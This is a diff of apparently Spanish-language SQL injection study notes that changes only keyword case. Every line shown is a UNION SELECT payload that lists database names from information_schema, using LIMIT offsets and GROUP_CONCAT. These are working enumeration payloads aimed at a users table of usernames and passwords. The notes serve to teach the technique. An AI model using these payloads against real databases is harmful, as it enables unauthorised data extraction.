@@ -108,17 +108,17 @@ select username,password from users where username = 'F0n3' union select 'izquie
 SELECT username,password FROM users UNION SELECT 1,schema_name FROM information_schema.schemata;
 
 ## Condition Union Select (v2):
-select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata;
+SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata;
 
 ## Condition Union Select (v2) + LIMIT:
-select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0,1;
-select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1,1;
-select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2,1;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0,1;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1,1;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2,1;
 
 ## Condition Union Select (v2) + LIMIT grupal (casi no se usa, los agrupa dependiendo el número):
-select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0;
-select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1;
-select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2;
 ````
 
 ---
@@ -134,7 +134,7 @@ select username,password from users where username = 'F0n3' UNION SELECT 1,schem
 SELECT username,password FROM users UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
 
 ## Condition Union Select (v2):
-SELECT username,password from users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
+SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
 ````
 
 
